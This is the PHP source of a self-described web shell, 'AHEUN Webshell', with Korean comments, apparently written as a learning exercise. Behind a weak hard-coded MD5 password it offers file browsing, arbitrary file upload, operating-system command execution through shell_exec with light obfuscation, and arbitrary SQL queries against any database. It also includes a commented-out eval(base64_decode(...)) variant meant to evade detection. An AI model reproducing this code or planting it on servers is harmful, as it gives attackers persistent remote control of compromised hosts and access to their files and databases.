<?
    session_start();
    header("Content-Type: text/html; charset=UTF-8");
    $mode = $_REQUEST["mode"]; # login, logout, fileupload, ...
    $path = $_REQUEST["path"];
    $page = basename($_SERVER["PHP_SELF"]);
    $fileName = $_GET["fileName"];
    $dbHost = $_POST["dbHost"];
    $dbId = $_POST["dbId"];
    $dbPw = $_POST["dbPw"];
    $dbName = $_POST["dbName"];
    $query = $_POST["query"];
    $inputPw = $_POST["inputPw"];
	#echo $inputPw; # 123456
	
	#echo __FILE__."<br>"; # /home/master/public_html/webshell.php
	#echo basename(__FILE__)."<br>"; # webshell.php
	#echo realpath(__FILE__)."<br>"; # /home/master/public_html/webshell.php

	if(empty($path)) {
        $tempFileName = basename(__FILE__);
        $tempPath = realpath(__FILE__);
        $path = str_replace($tempFileName, "", $tempPath);
        $path = str_replace("\\", "/", $path);
    } else {
        $path = realpath($path)."/";
        $path = str_replace("\\", "/", $path);
    }

    $accessPw = "e10adc3949ba59abbe56e057f20f883e"; # webshell password(123456)

	$accessFlag = $_SESSION["accessFlag"];
	#echo "accessFlag >> ".$accessFlag;
	
	if($accessFlag == "Y") {
		#echo "로그인 후";
		if($mode == "logout") {
			unset($_SESSION["accessFlag"]);
			session_destroy();
            echo "<script>location.href='{$page}'</script>";
            exit();
        } else if ($mode == "fileUpload" && !empty($_FILES["file"]["tmp_name"])) {
			echo "파일업로드를 실행합니다.";
			echo $path.$_FILES["file"]["name"]; # 서버가 가진 임시 이름

			$filePath = $path.$_FILES["file"]["name"]; # /home/master/public_html/uploads/
            if(!move_uploaded_file($_FILES["file"]["tmp_name"], $filePath)) {
                echo "<script>alert('파일 업로드에 실패하였습니다.');history.back(-1);</script>";
                exit();
            } else {
				echo "<script>alert('파일 업로드에 성공하였습니다.');</script>";
			}
            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
		}
	} else {
		#echo "로그인 전";
		if($mode == "login" && ($accessPw == md5($inputPw))) {
            $_SESSION["accessFlag"] = "Y";
			#echo "로그인처리 성공";
            echo "<script>location.href='{$page}'</script>";
            exit();
        }
	}
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <title>AHEUN Webshell</title>
    <!-- 합쳐지고 최소화된 최신 CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">

    <!-- 부가적인 테마 -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">

    <!-- 합쳐지고 최소화된 최신 자바스크립트 -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
    
</head>
<body>
<div class="container-fluid">
    <div class="row">
    <div class="col-md-3"></div>
    <div class="col-md-6">
		<? if($accessFlag != "Y") { ?>
            <h3>Login</h3>
            <hr>
            <form action="<?=$page?>?mode=login" method="POST">
            <div class="input-group">
            <span class="input-group-addon">Password</span>
            <input type="password" class="form-control" placeholder="Password Input..." name="inputPw">
            </div>
            <br>
            <p class="text-center"><button class="btn btn-default" type="submit">Auth</button></a>
            </form>
		<? } else { ?>
        <h3>Webshell <small>Create by AHEUN</small></h3>
        <hr>
        <ul class="nav nav-tabs">
        <li role="presentation" <? if(empty($mode) || $mode == "fileBrowser") echo "class=\"active\"";?>><a href="<?=$page?>?mode=fileBrowser">File Browser</a></li>
        <li role="presentation" <? if($mode == "fileUpload") echo "class=\"active\"";?>><a href="<?=$page?>?mode=fileUpload&path=<?=$path?>">File Upload</a></li>
        <li role="presentation" <? if($mode == "command") echo "class=\"active\"";?>><a href="<?=$page?>?mode=command">Command Execution</a></li>
        <li role="presentation" <? if($mode == "db") echo "class=\"active\"";?>><a href="<?=$page?>?mode=db">DB Connector</a></li>
        <li role="presentation"><a href="<?=$page?>?mode=logout">Logout</a></li>
        </ul>
        <br>

		<? if(empty($mode) || $mode == "fileBrowser") { ?>
        <form action="<?=$page?>?mode=fileBrowser" metho="GET">
            <div class="input-group">
            <span class="input-group-addon">Current Path</span>
            <input type="text" class="form-control" placeholder="Path Input..." name="path" value="<?=$path?>">
            <span class="input-group-btn">
            <button class="btn btn-default" type="submit">Move</button>
            </span>
            </div>
        </form>
        <hr>
        <div class="table-responsive">
        <table class="table table-bordered table-hover"style="table-layout: fixed; word-break: break-all;">
            <thead>
                <tr class="active">
                    <th style="width: 50%" class="text-center">Name</th>
                    <th style="width: 14%" class="text-center">Type</th>
                    <th style="width: 18%" class="text-center">Date</th>
                    <th style="width: 18%" class="text-center">Action</th>
                </tr>
            </thead>
            <tbody>
      </tbody>
    </table>
    <? } else if($mode == "fileUpload") { ?>
		<form action="<?=$page?>?mode=fileUpload" method="POST" enctype="multipart/form-data">
            <div class="input-group">
            <span class="input-group-addon">Upload Path</span>
            <input type="text" class="form-control" placeholder="Path Input..." name="path" value="<?=$path."uploads/"?>">
            <span class="input-group-btn">
            </span>
            </div>
            <hr>
            <div class="form-group">
            <label for="exampleInputFile">파일 업로드</label>
            <input type="file" id="exampleInputFile" name="file">
            <p class="help-block">※ 위의 Upload Path 경로로 업로드가 됩니다.</p>
            <p class="text-center"><button class="btn btn-default" type="submit">File Upload</button></a>
            </div>
        </form>
	<? } else if($mode == "command") {?>
	<form action="<?=$page?>?mode=command" method="POST">
		<div class="input-group">
		<span class="input-group-addon">Command</span>
		<input type="text" class="form-control" placeholder="Command Input..." name="command" value="<?=$_POST["command"]?>">
		<span class="input-group-btn">
		</span>
		</div>
		<br>
		<p class="text-center"><button class="btn btn-default" type="submit">Execution</button></a>
	</form>
		<?
		if(!empty($_POST["command"])) {
			echo "<hr>";
			$result = shell_exec/**/($_POST["command"]);
			#eval(base64_decode("JHJlc3VsdCA9IHNoZWxsX2V4ZWMoJF9QT1NUWyJjb21tYW5kIl0pOw=="));
			$result = str_replace("\n", "<br>", $result);
			$result = iconv("CP949", "UTF-8", $result);
			echo $result;
		}
		?>
		<? } else if($mode == "db") {?>
			<?
				if(empty($dbHost) || empty($dbId) || empty($dbPw) || empty($dbName)) {
			?>
        <form action="<?=$page?>?mode=db" method="POST">
            <div class="input-group">
            <span class="input-group-addon">HOST</span>
            <input type="text" class="form-control" placeholder="Host Input..." name="dbHost">
            <span class="input-group-addon">ID</span>
            <input type="text" class="form-control" placeholder="ID Input..." name="dbId">
            <span class="input-group-addon">PW</span>
            <input type="password" class="form-control" placeholder="PW Input..." name="dbPw">
            <span class="input-group-addon">DB</span>
            <input type="text" class="form-control" placeholder="DB Input..." name="dbName">
            </div>
            <br>
            <p class="text-center"><button class="btn btn-default" type="submit">Connection</button></a>
        </form>
        <?
            } else { 
                $dbConn = new mysqli($dbHost, $dbId, $dbPw, $dbName);
                if($dbConn->connect_errno) {
                    echo "<script>alert('DB 연결 실패');history.back(-1);</script>";
                    exit();
                }
        ?>
	        <form action="<?=$page?>?mode=db" method="POST">
            <div class="input-group">
            <span class="input-group-addon">SQL</span>
            <input type="text" class="form-control" placeholder="Query Input..." name="query" value="<?=$query?>">
            </div>
            <br>
            <p class="text-center"><button class="btn btn-default" type="submit">Execution</button></a>
            <input type="hidden" name="dbHost" value="<?=$dbHost?>">
            <input type="hidden" name="dbId" value="<?=$dbId?>">
            <input type="hidden" name="dbPw" value="<?=$dbPw?>">
            <input type="hidden" name="dbName" value="<?=$dbName?>">
        </form>
        <?
            if(!empty($query)){
                $result = $dbConn->query($query);
                $rowCnt = $result->num_rows;
        ?>
        <table class="table table-bordered table-hover">
        <?
            for($i=0; $i<$rowCnt; $i++) {
                $row = $result->fetch_assoc();
                if($i == 0) {
                    $ratio = 100 / count($row);
                    # 컬럼 출력을 위한 로직
                    ?>
                    <thead>
                    <tr class="active">
                    <?
                    foreach($row as $key => $value) {
                    ?>
                    <th style="width: <?=$ratio?>%" class="text-center"><?=$key?></th>
                    <?
                    }
                    ?>
                    </tr>
                    </thead>
                    <tbody>
                    <?
                }
                echo "<tr>";
                foreach($row as $key => $value) {
                ?>
                    <td style="vertical-align: middle" class="text-center"><?=$value?></td>
                <?
                }
                echo "</tr>";
            }
        ?>
            </tbody>
        </table>
        <?
            }
        ?>
	<? } ?>
	<? } ?>
	<? } ?> <!-- if($accessFlag != "Y") - else의 닫는 괄호 -->
</body>
</html>